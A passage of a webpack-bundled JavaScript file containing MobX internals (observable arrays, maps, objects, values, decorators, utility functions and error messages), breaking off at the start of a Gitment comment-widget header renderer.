function createArrayBufferItem(index) {
    var set = createArraySetter(index);
    var get = createArrayGetter(index);
    Object.defineProperty(ObservableArray.prototype, "" + index, {
        enumerable: false,
        configurable: true,
        set: set, get: get
    });
}
function createArraySetter(index) {
    return function (newValue) {
        var adm = this.$mobx;
        var values = adm.values;
        if (index < values.length) {
            checkIfStateModificationsAreAllowed(adm.atom);
            var oldValue = values[index];
            if (hasInterceptors(adm)) {
                var change = interceptChange(adm, {
                    type: "update",
                    object: adm.array,
                    index: index, newValue: newValue
                });
                if (!change) return;
                newValue = change.newValue;
            }
            newValue = adm.enhancer(newValue, oldValue);
            var changed = newValue !== oldValue;
            if (changed) {
                values[index] = newValue;
                adm.notifyArrayChildUpdate(index, newValue, oldValue);
            }
        } else if (index === values.length) {
            adm.spliceWithArray(index, 0, [newValue]);
        } else throw new Error("[mobx.array] Index out of bounds, " + index + " is larger than " + values.length);
    };
}
function createArrayGetter(index) {
    return function () {
        var impl = this.$mobx;
        if (impl) {
            if (index < impl.values.length) {
                impl.atom.reportObserved();
                return impl.values[index];
            }
            console.warn("[mobx.array] Attempt to read an array index (" + index + ") that is out of bounds (" + impl.values.length + "). Please check length first. Out of bound indices will not be tracked by MobX");
        }
        return undefined;
    };
}
function reserveArrayBuffer(max) {
    for (var index = OBSERVABLE_ARRAY_BUFFER_SIZE; index < max; index++) {
        createArrayBufferItem(index);
    }OBSERVABLE_ARRAY_BUFFER_SIZE = max;
}
reserveArrayBuffer(1000);
var isObservableArrayAdministration = createInstanceofPredicate("ObservableArrayAdministration", ObservableArrayAdministration);
function isObservableArray(thing) {
    return isObject(thing) && isObservableArrayAdministration(thing.$mobx);
}
exports.isObservableArray = isObservableArray;
var ObservableMapMarker = {};
var ObservableMap = function () {
    function ObservableMap(initialData, enhancer, name) {
        if (enhancer === void 0) {
            enhancer = deepEnhancer;
        }
        if (name === void 0) {
            name = "ObservableMap@" + getNextId();
        }
        this.enhancer = enhancer;
        this.name = name;
        this.$mobx = ObservableMapMarker;
        this._data = {};
        this._hasMap = {};
        this._keys = new ObservableArray(undefined, referenceEnhancer, this.name + ".keys()", true);
        this.interceptors = null;
        this.changeListeners = null;
        this.merge(initialData);
    }
    ObservableMap.prototype._has = function (key) {
        return typeof this._data[key] !== "undefined";
    };
    ObservableMap.prototype.has = function (key) {
        if (!this.isValidKey(key)) return false;
        key = "" + key;
        if (this._hasMap[key]) return this._hasMap[key].get();
        return this._updateHasMapEntry(key, false).get();
    };
    ObservableMap.prototype.set = function (key, value) {
        this.assertValidKey(key);
        key = "" + key;
        var hasKey = this._has(key);
        if (hasInterceptors(this)) {
            var change = interceptChange(this, {
                type: hasKey ? "update" : "add",
                object: this,
                newValue: value,
                name: key
            });
            if (!change) return this;
            value = change.newValue;
        }
        if (hasKey) {
            this._updateValue(key, value);
        } else {
            this._addValue(key, value);
        }
        return this;
    };
    ObservableMap.prototype.delete = function (key) {
        var _this = this;
        this.assertValidKey(key);
        key = "" + key;
        if (hasInterceptors(this)) {
            var change = interceptChange(this, {
                type: "delete",
                object: this,
                name: key
            });
            if (!change) return false;
        }
        if (this._has(key)) {
            var notifySpy = isSpyEnabled();
            var notify = hasListeners(this);
            var change = notify || notifySpy ? {
                type: "delete",
                object: this,
                oldValue: this._data[key].value,
                name: key
            } : null;
            if (notifySpy) spyReportStart(change);
            runInTransaction(function () {
                _this._keys.remove(key);
                _this._updateHasMapEntry(key, false);
                var observable = _this._data[key];
                observable.setNewValue(undefined);
                _this._data[key] = undefined;
            });
            if (notify) notifyListeners(this, change);
            if (notifySpy) spyReportEnd();
            return true;
        }
        return false;
    };
    ObservableMap.prototype._updateHasMapEntry = function (key, value) {
        var entry = this._hasMap[key];
        if (entry) {
            entry.setNewValue(value);
        } else {
            entry = this._hasMap[key] = new ObservableValue(value, referenceEnhancer, this.name + "." + key + "?", false);
        }
        return entry;
    };
    ObservableMap.prototype._updateValue = function (name, newValue) {
        var observable = this._data[name];
        newValue = observable.prepareNewValue(newValue);
        if (newValue !== UNCHANGED) {
            var notifySpy = isSpyEnabled();
            var notify = hasListeners(this);
            var change = notify || notifySpy ? {
                type: "update",
                object: this,
                oldValue: observable.value,
                name: name, newValue: newValue
            } : null;
            if (notifySpy) spyReportStart(change);
            observable.setNewValue(newValue);
            if (notify) notifyListeners(this, change);
            if (notifySpy) spyReportEnd();
        }
    };
    ObservableMap.prototype._addValue = function (name, newValue) {
        var _this = this;
        runInTransaction(function () {
            var observable = _this._data[name] = new ObservableValue(newValue, _this.enhancer, _this.name + "." + name, false);
            newValue = observable.value;
            _this._updateHasMapEntry(name, true);
            _this._keys.push(name);
        });
        var notifySpy = isSpyEnabled();
        var notify = hasListeners(this);
        var change = notify || notifySpy ? {
            type: "add",
            object: this,
            name: name, newValue: newValue
        } : null;
        if (notifySpy) spyReportStart(change);
        if (notify) notifyListeners(this, change);
        if (notifySpy) spyReportEnd();
    };
    ObservableMap.prototype.get = function (key) {
        key = "" + key;
        if (this.has(key)) return this._data[key].get();
        return undefined;
    };
    ObservableMap.prototype.keys = function () {
        return arrayAsIterator(this._keys.slice());
    };
    ObservableMap.prototype.values = function () {
        return arrayAsIterator(this._keys.map(this.get, this));
    };
    ObservableMap.prototype.entries = function () {
        var _this = this;
        return arrayAsIterator(this._keys.map(function (key) {
            return [key, _this.get(key)];
        }));
    };
    ObservableMap.prototype.forEach = function (callback, thisArg) {
        var _this = this;
        this.keys().forEach(function (key) {
            return callback.call(thisArg, _this.get(key), key, _this);
        });
    };
    ObservableMap.prototype.merge = function (other) {
        var _this = this;
        if (isObservableMap(other)) {
            other = other.toJS();
        }
        runInTransaction(function () {
            if (isPlainObject(other)) Object.keys(other).forEach(function (key) {
                return _this.set(key, other[key]);
            });else if (Array.isArray(other)) other.forEach(function (_a) {
                var key = _a[0],
                    value = _a[1];
                return _this.set(key, value);
            });else if (isES6Map(other)) other.forEach(function (value, key) {
                return _this.set(key, value);
            });else if (other !== null && other !== undefined) fail("Cannot initialize map from " + other);
        });
        return this;
    };
    ObservableMap.prototype.clear = function () {
        var _this = this;
        runInTransaction(function () {
            untracked(function () {
                _this.keys().forEach(_this.delete, _this);
            });
        });
    };
    ObservableMap.prototype.replace = function (values) {
        var _this = this;
        runInTransaction(function () {
            _this.clear();
            _this.merge(values);
        });
        return this;
    };
    Object.defineProperty(ObservableMap.prototype, "size", {
        get: function get() {
            return this._keys.length;
        },
        enumerable: true,
        configurable: true
    });
    ObservableMap.prototype.toJS = function () {
        var _this = this;
        var res = {};
        this.keys().forEach(function (key) {
            return res[key] = _this.get(key);
        });
        return res;
    };
    ObservableMap.prototype.toJSON = function () {
        return this.toJS();
    };
    ObservableMap.prototype.isValidKey = function (key) {
        if (key === null || key === undefined) return false;
        if (typeof key === "string" || typeof key === "number" || typeof key === "boolean") return true;
        return false;
    };
    ObservableMap.prototype.assertValidKey = function (key) {
        if (!this.isValidKey(key)) throw new Error("[mobx.map] Invalid key: '" + key + "', only strings, numbers and booleans are accepted as key in observable maps.");
    };
    ObservableMap.prototype.toString = function () {
        var _this = this;
        return this.name + "[{ " + this.keys().map(function (key) {
            return key + ": " + ("" + _this.get(key));
        }).join(", ") + " }]";
    };
    ObservableMap.prototype.observe = function (listener, fireImmediately) {
        invariant(fireImmediately !== true, getMessage("m033"));
        return registerListener(this, listener);
    };
    ObservableMap.prototype.intercept = function (handler) {
        return registerInterceptor(this, handler);
    };
    return ObservableMap;
}();
exports.ObservableMap = ObservableMap;
declareIterator(ObservableMap.prototype, function () {
    return this.entries();
});
function map(initialValues) {
    deprecated("`mobx.map` is deprecated, use `new ObservableMap` or `mobx.observable.map` instead");
    return observable.map(initialValues);
}
exports.map = map;
var isObservableMap = createInstanceofPredicate("ObservableMap", ObservableMap);
exports.isObservableMap = isObservableMap;
var ObservableObjectAdministration = function () {
    function ObservableObjectAdministration(target, name) {
        this.target = target;
        this.name = name;
        this.values = {};
        this.changeListeners = null;
        this.interceptors = null;
    }
    ObservableObjectAdministration.prototype.observe = function (callback, fireImmediately) {
        invariant(fireImmediately !== true, "`observe` doesn't support the fire immediately property for observable objects.");
        return registerListener(this, callback);
    };
    ObservableObjectAdministration.prototype.intercept = function (handler) {
        return registerInterceptor(this, handler);
    };
    return ObservableObjectAdministration;
}();
function asObservableObject(target, name) {
    if (isObservableObject(target)) return target.$mobx;
    invariant(Object.isExtensible(target), getMessage("m035"));
    if (!isPlainObject(target)) name = (target.constructor.name || "ObservableObject") + "@" + getNextId();
    if (!name) name = "ObservableObject@" + getNextId();
    var adm = new ObservableObjectAdministration(target, name);
    addHiddenFinalProp(target, "$mobx", adm);
    return adm;
}
function defineObservablePropertyFromDescriptor(adm, propName, descriptor, defaultEnhancer) {
    if (adm.values[propName]) {
        invariant("value" in descriptor, "The property " + propName + " in " + adm.name + " is already observable, cannot redefine it as computed property");
        adm.target[propName] = descriptor.value;
        return;
    }
    if ("value" in descriptor) {
        if (isModifierDescriptor(descriptor.value)) {
            var modifierDescriptor = descriptor.value;
            defineObservableProperty(adm, propName, modifierDescriptor.initialValue, modifierDescriptor.enhancer);
        } else if (isAction(descriptor.value) && descriptor.value.autoBind === true) {
            defineBoundAction(adm.target, propName, descriptor.value.originalFn);
        } else if (isComputedValue(descriptor.value)) {
            defineComputedPropertyFromComputedValue(adm, propName, descriptor.value);
        } else {
            defineObservableProperty(adm, propName, descriptor.value, defaultEnhancer);
        }
    } else {
        defineComputedProperty(adm, propName, descriptor.get, descriptor.set, false, true);
    }
}
function defineObservableProperty(adm, propName, newValue, enhancer) {
    assertPropertyConfigurable(adm.target, propName);
    if (hasInterceptors(adm)) {
        var change = interceptChange(adm, {
            object: adm.target,
            name: propName,
            type: "add",
            newValue: newValue
        });
        if (!change) return;
        newValue = change.newValue;
    }
    var observable = adm.values[propName] = new ObservableValue(newValue, enhancer, adm.name + "." + propName, false);
    newValue = observable.value;
    Object.defineProperty(adm.target, propName, generateObservablePropConfig(propName));
    notifyPropertyAddition(adm, adm.target, propName, newValue);
}
function defineComputedProperty(adm, propName, getter, setter, compareStructural, asInstanceProperty) {
    if (asInstanceProperty) assertPropertyConfigurable(adm.target, propName);
    adm.values[propName] = new ComputedValue(getter, adm.target, compareStructural, adm.name + "." + propName, setter);
    if (asInstanceProperty) {
        Object.defineProperty(adm.target, propName, generateComputedPropConfig(propName));
    }
}
function defineComputedPropertyFromComputedValue(adm, propName, computedValue) {
    var name = adm.name + "." + propName;
    computedValue.name = name;
    if (!computedValue.scope) computedValue.scope = adm.target;
    adm.values[propName] = computedValue;
    Object.defineProperty(adm.target, propName, generateComputedPropConfig(propName));
}
var observablePropertyConfigs = {};
var computedPropertyConfigs = {};
function generateObservablePropConfig(propName) {
    return observablePropertyConfigs[propName] || (observablePropertyConfigs[propName] = {
        configurable: true,
        enumerable: true,
        get: function get() {
            return this.$mobx.values[propName].get();
        },
        set: function set(v) {
            setPropertyValue(this, propName, v);
        }
    });
}
function generateComputedPropConfig(propName) {
    return computedPropertyConfigs[propName] || (computedPropertyConfigs[propName] = {
        configurable: true,
        enumerable: false,
        get: function get() {
            return this.$mobx.values[propName].get();
        },
        set: function set(v) {
            return this.$mobx.values[propName].set(v);
        }
    });
}
function setPropertyValue(instance, name, newValue) {
    var adm = instance.$mobx;
    var observable = adm.values[name];
    if (hasInterceptors(adm)) {
        var change = interceptChange(adm, {
            type: "update",
            object: instance,
            name: name, newValue: newValue
        });
        if (!change) return;
        newValue = change.newValue;
    }
    newValue = observable.prepareNewValue(newValue);
    if (newValue !== UNCHANGED) {
        var notify = hasListeners(adm);
        var notifySpy = isSpyEnabled();
        var change = notify || notifySpy ? {
            type: "update",
            object: instance,
            oldValue: observable.value,
            name: name, newValue: newValue
        } : null;
        if (notifySpy) spyReportStart(change);
        observable.setNewValue(newValue);
        if (notify) notifyListeners(adm, change);
        if (notifySpy) spyReportEnd();
    }
}
function notifyPropertyAddition(adm, object, name, newValue) {
    var notify = hasListeners(adm);
    var notifySpy = isSpyEnabled();
    var change = notify || notifySpy ? {
        type: "add",
        object: object, name: name, newValue: newValue
    } : null;
    if (notifySpy) spyReportStart(change);
    if (notify) notifyListeners(adm, change);
    if (notifySpy) spyReportEnd();
}
var isObservableObjectAdministration = createInstanceofPredicate("ObservableObjectAdministration", ObservableObjectAdministration);
function isObservableObject(thing) {
    if (isObject(thing)) {
        runLazyInitializers(thing);
        return isObservableObjectAdministration(thing.$mobx);
    }
    return false;
}
exports.isObservableObject = isObservableObject;
var UNCHANGED = {};
var ObservableValue = function (_super) {
    __extends(ObservableValue, _super);
    function ObservableValue(value, enhancer, name, notifySpy) {
        if (name === void 0) {
            name = "ObservableValue@" + getNextId();
        }
        if (notifySpy === void 0) {
            notifySpy = true;
        }
        var _this = _super.call(this, name) || this;
        _this.enhancer = enhancer;
        _this.hasUnreportedChange = false;
        _this.value = enhancer(value, undefined, name);
        if (notifySpy && isSpyEnabled()) {
            spyReport({ type: "create", object: _this, newValue: _this.value });
        }
        return _this;
    }
    ObservableValue.prototype.set = function (newValue) {
        var oldValue = this.value;
        newValue = this.prepareNewValue(newValue);
        if (newValue !== UNCHANGED) {
            var notifySpy = isSpyEnabled();
            if (notifySpy) {
                spyReportStart({
                    type: "update",
                    object: this,
                    newValue: newValue, oldValue: oldValue
                });
            }
            this.setNewValue(newValue);
            if (notifySpy) spyReportEnd();
        }
    };
    ObservableValue.prototype.prepareNewValue = function (newValue) {
        checkIfStateModificationsAreAllowed(this);
        if (hasInterceptors(this)) {
            var change = interceptChange(this, { object: this, type: "update", newValue: newValue });
            if (!change) return UNCHANGED;
            newValue = change.newValue;
        }
        newValue = this.enhancer(newValue, this.value, this.name);
        return this.value !== newValue ? newValue : UNCHANGED;
    };
    ObservableValue.prototype.setNewValue = function (newValue) {
        var oldValue = this.value;
        this.value = newValue;
        this.reportChanged();
        if (hasListeners(this)) {
            notifyListeners(this, {
                type: "update",
                object: this,
                newValue: newValue,
                oldValue: oldValue
            });
        }
    };
    ObservableValue.prototype.get = function () {
        this.reportObserved();
        return this.value;
    };
    ObservableValue.prototype.intercept = function (handler) {
        return registerInterceptor(this, handler);
    };
    ObservableValue.prototype.observe = function (listener, fireImmediately) {
        if (fireImmediately) listener({
            object: this,
            type: "update",
            newValue: this.value,
            oldValue: undefined
        });
        return registerListener(this, listener);
    };
    ObservableValue.prototype.toJSON = function () {
        return this.get();
    };
    ObservableValue.prototype.toString = function () {
        return this.name + "[" + this.value + "]";
    };
    ObservableValue.prototype.valueOf = function () {
        return toPrimitive(this.get());
    };
    return ObservableValue;
}(BaseAtom);
ObservableValue.prototype[primitiveSymbol()] = ObservableValue.prototype.valueOf;
var isObservableValue = createInstanceofPredicate("ObservableValue", ObservableValue);
exports.isBoxedObservable = isObservableValue;
function getAtom(thing, property) {
    if ((typeof thing === "undefined" ? "undefined" : _typeof(thing)) === "object" && thing !== null) {
        if (isObservableArray(thing)) {
            invariant(property === undefined, getMessage("m036"));
            return thing.$mobx.atom;
        }
        if (isObservableMap(thing)) {
            var anyThing = thing;
            if (property === undefined) return getAtom(anyThing._keys);
            var observable_2 = anyThing._data[property] || anyThing._hasMap[property];
            invariant(!!observable_2, "the entry '" + property + "' does not exist in the observable map '" + getDebugName(thing) + "'");
            return observable_2;
        }
        runLazyInitializers(thing);
        if (isObservableObject(thing)) {
            if (!property) return fail("please specify a property");
            var observable_3 = thing.$mobx.values[property];
            invariant(!!observable_3, "no observable property '" + property + "' found on the observable object '" + getDebugName(thing) + "'");
            return observable_3;
        }
        if (isAtom(thing) || isComputedValue(thing) || isReaction(thing)) {
            return thing;
        }
    } else if (typeof thing === "function") {
        if (isReaction(thing.$mobx)) {
            return thing.$mobx;
        }
    }
    return fail("Cannot obtain atom from " + thing);
}
function getAdministration(thing, property) {
    invariant(thing, "Expecting some object");
    if (property !== undefined) return getAdministration(getAtom(thing, property));
    if (isAtom(thing) || isComputedValue(thing) || isReaction(thing)) return thing;
    if (isObservableMap(thing)) return thing;
    runLazyInitializers(thing);
    if (thing.$mobx) return thing.$mobx;
    invariant(false, "Cannot obtain administration from " + thing);
}
function getDebugName(thing, property) {
    var named;
    if (property !== undefined) named = getAtom(thing, property);else if (isObservableObject(thing) || isObservableMap(thing)) named = getAdministration(thing);else named = getAtom(thing);
    return named.name;
}
function createClassPropertyDecorator(onInitialize, _get, _set, enumerable, allowCustomArguments) {
    function classPropertyDecorator(target, key, descriptor, customArgs, argLen) {
        if (argLen === void 0) {
            argLen = 0;
        }
        invariant(allowCustomArguments || quacksLikeADecorator(arguments), "This function is a decorator, but it wasn't invoked like a decorator");
        if (!descriptor) {
            var newDescriptor = {
                enumerable: enumerable,
                configurable: true,
                get: function get() {
                    if (!this.__mobxInitializedProps || this.__mobxInitializedProps[key] !== true) typescriptInitializeProperty(this, key, undefined, onInitialize, customArgs, descriptor);
                    return _get.call(this, key);
                },
                set: function set(v) {
                    if (!this.__mobxInitializedProps || this.__mobxInitializedProps[key] !== true) {
                        typescriptInitializeProperty(this, key, v, onInitialize, customArgs, descriptor);
                    } else {
                        _set.call(this, key, v);
                    }
                }
            };
            if (arguments.length < 3 || arguments.length === 5 && argLen < 3) {
                Object.defineProperty(target, key, newDescriptor);
            }
            return newDescriptor;
        } else {
            if (!hasOwnProperty(target, "__mobxLazyInitializers")) {
                addHiddenProp(target, "__mobxLazyInitializers", target.__mobxLazyInitializers && target.__mobxLazyInitializers.slice() || []);
            }
            var value_1 = descriptor.value,
                initializer_1 = descriptor.initializer;
            target.__mobxLazyInitializers.push(function (instance) {
                onInitialize(instance, key, initializer_1 ? initializer_1.call(instance) : value_1, customArgs, descriptor);
            });
            return {
                enumerable: enumerable, configurable: true,
                get: function get() {
                    if (this.__mobxDidRunLazyInitializers !== true) runLazyInitializers(this);
                    return _get.call(this, key);
                },
                set: function set(v) {
                    if (this.__mobxDidRunLazyInitializers !== true) runLazyInitializers(this);
                    _set.call(this, key, v);
                }
            };
        }
    }
    if (allowCustomArguments) {
        return function () {
            if (quacksLikeADecorator(arguments)) return classPropertyDecorator.apply(null, arguments);
            var outerArgs = arguments;
            var argLen = arguments.length;
            return function (target, key, descriptor) {
                return classPropertyDecorator(target, key, descriptor, outerArgs, argLen);
            };
        };
    }
    return classPropertyDecorator;
}
function typescriptInitializeProperty(instance, key, v, onInitialize, customArgs, baseDescriptor) {
    if (!hasOwnProperty(instance, "__mobxInitializedProps")) addHiddenProp(instance, "__mobxInitializedProps", {});
    instance.__mobxInitializedProps[key] = true;
    onInitialize(instance, key, v, customArgs, baseDescriptor);
}
function runLazyInitializers(instance) {
    if (instance.__mobxDidRunLazyInitializers === true) return;
    if (instance.__mobxLazyInitializers) {
        addHiddenProp(instance, "__mobxDidRunLazyInitializers", true);
        instance.__mobxDidRunLazyInitializers && instance.__mobxLazyInitializers.forEach(function (initializer) {
            return initializer(instance);
        });
    }
}
function quacksLikeADecorator(args) {
    return (args.length === 2 || args.length === 3) && typeof args[1] === "string";
}
function iteratorSymbol() {
    return typeof Symbol === "function" && Symbol.iterator || "@@iterator";
}
var IS_ITERATING_MARKER = "__$$iterating";
function arrayAsIterator(array) {
    invariant(array[IS_ITERATING_MARKER] !== true, "Illegal state: cannot recycle array as iterator");
    addHiddenFinalProp(array, IS_ITERATING_MARKER, true);
    var idx = -1;
    addHiddenFinalProp(array, "next", function next() {
        idx++;
        return {
            done: idx >= this.length,
            value: idx < this.length ? this[idx] : undefined
        };
    });
    return array;
}
function declareIterator(prototType, iteratorFactory) {
    addHiddenFinalProp(prototType, iteratorSymbol(), iteratorFactory);
}
var messages = {
    "m001": "It is not allowed to assign new values to @action fields",
    "m002": "`runInAction` expects a function",
    "m003": "`runInAction` expects a function without arguments",
    "m004": "autorun expects a function",
    "m005": "Warning: attempted to pass an action to autorun. Actions are untracked and will not trigger on state changes. Use `reaction` or wrap only your state modification code in an action.",
    "m006": "Warning: attempted to pass an action to autorunAsync. Actions are untracked and will not trigger on state changes. Use `reaction` or wrap only your state modification code in an action.",
    "m007": "reaction only accepts 2 or 3 arguments. If migrating from MobX 2, please provide an options object",
    "m008": "wrapping reaction expression in `asReference` is no longer supported, use options object instead",
    "m009": "@computed can only be used on getter functions, like: '@computed get myProps() { return ...; }'. It looks like it was used on a property.",
    "m010": "@computed can only be used on getter functions, like: '@computed get myProps() { return ...; }'",
    "m011": "First argument to `computed` should be an expression. If using computed as decorator, don't pass it arguments",
    "m012": "computed takes one or two arguments if used as function",
    "m013": "[mobx.expr] 'expr' should only be used inside other reactive functions.",
    "m014": "extendObservable expected 2 or more arguments",
    "m015": "extendObservable expects an object as first argument",
    "m016": "extendObservable should not be used on maps, use map.merge instead",
    "m017": "all arguments of extendObservable should be objects",
    "m018": "extending an object with another observable (object) is not supported. Please construct an explicit propertymap, using `toJS` if need. See issue #540",
    "m019": "[mobx.isObservable] isObservable(object, propertyName) is not supported for arrays and maps. Use map.has or array.length instead.",
    "m020": "modifiers can only be used for individual object properties",
    "m021": "observable expects zero or one arguments",
    "m022": "@observable can not be used on getters, use @computed instead",
    "m023": "Using `transaction` is deprecated, use `runInAction` or `(@)action` instead.",
    "m024": "whyRun() can only be used if a derivation is active, or by passing an computed value / reaction explicitly. If you invoked whyRun from inside a computation; the computation is currently suspended but re-evaluating because somebody requested its value.",
    "m025": "whyRun can only be used on reactions and computed values",
    "m026": "`action` can only be invoked on functions",
    "m028": "It is not allowed to set `useStrict` when a derivation is running",
    "m029": "INTERNAL ERROR only onBecomeUnobserved shouldn't be called twice in a row",
    "m030a": "Since strict-mode is enabled, changing observed observable values outside actions is not allowed. Please wrap the code in an `action` if this change is intended. Tried to modify: ",
    "m030b": "Side effects like changing state are not allowed at this point. Are you trying to modify state from, for example, the render function of a React component? Tried to modify: ",
    "m031": "Computed values are not allowed to not cause side effects by changing observables that are already being observed. Tried to modify: ",
    "m032": "* This computation is suspended (not in use by any reaction) and won't run automatically.\n	Didn't expect this computation to be suspended at this point?\n	  1. Make sure this computation is used by a reaction (reaction, autorun, observer).\n	  2. Check whether you are using this computation synchronously (in the same stack as they reaction that needs it).",
    "m033": "`observe` doesn't support the fire immediately property for observable maps.",
    "m034": "`mobx.map` is deprecated, use `new ObservableMap` or `mobx.observable.map` instead",
    "m035": "Cannot make the designated object observable; it is not extensible",
    "m036": "It is not possible to get index atoms from arrays",
    "m037": "Hi there! I'm sorry you have just run into an exception.\nIf your debugger ends up here, know that some reaction (like the render() of an observer component, autorun or reaction)\nthrew an exception and that mobx caught it, to avoid that it brings the rest of your application down.\nThe original cause of the exception (the code that caused this reaction to run (again)), is still in the stack.\n\nHowever, more interesting is the actual stack trace of the error itself.\nHopefully the error is an instanceof Error, because in that case you can inspect the original stack of the error from where it was thrown.\nSee `error.stack` property, or press the very subtle \"(...)\" link you see near the console.error message that probably brought you here.\nThat stack is more interesting than the stack of this console.error itself.\n\nIf the exception you see is an exception you created yourself, make sure to use `throw new Error(\"Oops\")` instead of `throw \"Oops\"`,\nbecause the javascript environment will only preserve the original stack trace in the first form.\n\nYou can also make sure the debugger pauses the next time this very same exception is thrown by enabling \"Pause on caught exception\".\n(Note that it might pause on many other, unrelated exception as well).\n\nIf that all doesn't help you out, feel free to open an issue https://github.com/mobxjs/mobx/issues!\n",
    "m038": "Missing items in this list?\n    1. Check whether all used values are properly marked as observable (use isObservable to verify)\n    2. Make sure you didn't dereference values too early. MobX observes props, not primitives. E.g: use 'person.name' instead of 'name' in your computation.\n"
};
function getMessage(id) {
    return messages[id];
}
var EMPTY_ARRAY = [];
Object.freeze(EMPTY_ARRAY);
function getGlobal() {
    return global;
}
function getNextId() {
    return ++globalState.mobxGuid;
}
function fail(message, thing) {
    invariant(false, message, thing);
    throw "X";
}
function invariant(check, message, thing) {
    if (!check) throw new Error("[mobx] Invariant failed: " + message + (thing ? " in '" + thing + "'" : ""));
}
var deprecatedMessages = [];
function deprecated(msg) {
    if (deprecatedMessages.indexOf(msg) !== -1) return false;
    deprecatedMessages.push(msg);
    console.error("[mobx] Deprecated: " + msg);
    return true;
}
function once(func) {
    var invoked = false;
    return function () {
        if (invoked) return;
        invoked = true;
        return func.apply(this, arguments);
    };
}
var noop = function noop() {};
function unique(list) {
    var res = [];
    list.forEach(function (item) {
        if (res.indexOf(item) === -1) res.push(item);
    });
    return res;
}
function joinStrings(things, limit, separator) {
    if (limit === void 0) {
        limit = 100;
    }
    if (separator === void 0) {
        separator = " - ";
    }
    if (!things) return "";
    var sliced = things.slice(0, limit);
    return "" + sliced.join(separator) + (things.length > limit ? " (... and " + (things.length - limit) + "more)" : "");
}
function isObject(value) {
    return value !== null && (typeof value === "undefined" ? "undefined" : _typeof(value)) === "object";
}
function isPlainObject(value) {
    if (value === null || (typeof value === "undefined" ? "undefined" : _typeof(value)) !== "object") return false;
    var proto = Object.getPrototypeOf(value);
    return proto === Object.prototype || proto === null;
}
function objectAssign() {
    var res = arguments[0];
    for (var i = 1, l = arguments.length; i < l; i++) {
        var source = arguments[i];
        for (var key in source) {
            if (hasOwnProperty(source, key)) {
                res[key] = source[key];
            }
        }
    }
    return res;
}
function valueDidChange(compareStructural, oldValue, newValue) {
    if (typeof oldValue === 'number' && isNaN(oldValue)) {
        return typeof newValue !== 'number' || !isNaN(newValue);
    }
    return compareStructural ? !deepEqual(oldValue, newValue) : oldValue !== newValue;
}
var prototypeHasOwnProperty = Object.prototype.hasOwnProperty;
function hasOwnProperty(object, propName) {
    return prototypeHasOwnProperty.call(object, propName);
}
function makeNonEnumerable(object, propNames) {
    for (var i = 0; i < propNames.length; i++) {
        addHiddenProp(object, propNames[i], object[propNames[i]]);
    }
}
function addHiddenProp(object, propName, value) {
    Object.defineProperty(object, propName, {
        enumerable: false,
        writable: true,
        configurable: true,
        value: value
    });
}
function addHiddenFinalProp(object, propName, value) {
    Object.defineProperty(object, propName, {
        enumerable: false,
        writable: false,
        configurable: true,
        value: value
    });
}
function isPropertyConfigurable(object, prop) {
    var descriptor = Object.getOwnPropertyDescriptor(object, prop);
    return !descriptor || descriptor.configurable !== false && descriptor.writable !== false;
}
function assertPropertyConfigurable(object, prop) {
    invariant(isPropertyConfigurable(object, prop), "Cannot make property '" + prop + "' observable, it is not configurable and writable in the target object");
}
function getEnumerableKeys(obj) {
    var res = [];
    for (var key in obj) {
        res.push(key);
    }return res;
}
function deepEqual(a, b) {
    if (a === null && b === null) return true;
    if (a === undefined && b === undefined) return true;
    if ((typeof a === "undefined" ? "undefined" : _typeof(a)) !== "object") return a === b;
    var aIsArray = isArrayLike(a);
    var aIsMap = isMapLike(a);
    if (aIsArray !== isArrayLike(b)) {
        return false;
    } else if (aIsMap !== isMapLike(b)) {
        return false;
    } else if (aIsArray) {
        if (a.length !== b.length) return false;
        for (var i = a.length - 1; i >= 0; i--) {
            if (!deepEqual(a[i], b[i])) return false;
        }return true;
    } else if (aIsMap) {
        if (a.size !== b.size) return false;
        var equals_1 = true;
        a.forEach(function (value, key) {
            equals_1 = equals_1 && deepEqual(b.get(key), value);
        });
        return equals_1;
    } else if ((typeof a === "undefined" ? "undefined" : _typeof(a)) === "object" && (typeof b === "undefined" ? "undefined" : _typeof(b)) === "object") {
        if (a === null || b === null) return false;
        if (isMapLike(a) && isMapLike(b)) {
            if (a.size !== b.size) return false;
            return deepEqual(observable.shallowMap(a).entries(), observable.shallowMap(b).entries());
        }
        if (getEnumerableKeys(a).length !== getEnumerableKeys(b).length) return false;
        for (var prop in a) {
            if (!(prop in b)) return false;
            if (!deepEqual(a[prop], b[prop])) return false;
        }
        return true;
    }
    return false;
}
function createInstanceofPredicate(name, clazz) {
    var propName = "isMobX" + name;
    clazz.prototype[propName] = true;
    return function (x) {
        return isObject(x) && x[propName] === true;
    };
}
function isArrayLike(x) {
    return Array.isArray(x) || isObservableArray(x);
}
exports.isArrayLike = isArrayLike;
function isMapLike(x) {
    return isES6Map(x) || isObservableMap(x);
}
function isES6Map(thing) {
    if (getGlobal().Map !== undefined && thing instanceof getGlobal().Map) return true;
    return false;
}
function primitiveSymbol() {
    return typeof Symbol === "function" && Symbol.toPrimitive || "@@toPrimitive";
}
function toPrimitive(value) {
    return value === null ? null : (typeof value === "undefined" ? "undefined" : _typeof(value)) === "object" ? "" + value : value;
}
/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(4)))

/***/ }),
/* 2 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
  value: true
});

var _slicedToArray = function () { function sliceIterator(arr, i) { var _arr = []; var _n = true; var _d = false; var _e = undefined; try { for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) { _arr.push(_s.value); if (i && _arr.length === i) break; } } catch (err) { _d = true; _e = err; } finally { try { if (!_n && _i["return"]) _i["return"](); } finally { if (_d) throw _e; } } return _arr; } return function (arr, i) { if (Array.isArray(arr)) { return arr; } else if (Symbol.iterator in Object(arr)) { return sliceIterator(arr, i); } else { throw new TypeError("Invalid attempt to destructure non-iterable instance"); } }; }();

var _icons = __webpack_require__(6);

var _constants = __webpack_require__(0);

function renderHeader(_ref, instance) {
  var meta = _ref.meta,
      user = _ref.user,
      reactions = _ref.reactions;

  var container = document.createElement('div');
  container.lang = "en-US";
  container.className = 'gitment-container gitment-header-container';

  var likeButton = document.createElement('span');
  var likedReaction = reactions.find(function (reaction) {
    return reaction.content === 'heart' && reaction.user.login === user.login;
  });
  likeButton.className = 'gitment-header-like-btn';
  likeButton.innerHTML = '\n    ' + _icons.heart + '\n    ' + (likedReaction ? 'Unlike' : 'Like') + '\n    ' + (meta.reactions && meta.reactions.heart ? ' \u2022 <strong>' + meta.reactions.heart + '</strong> Liked' : '') + '\n  ';

  if (likedReaction) {
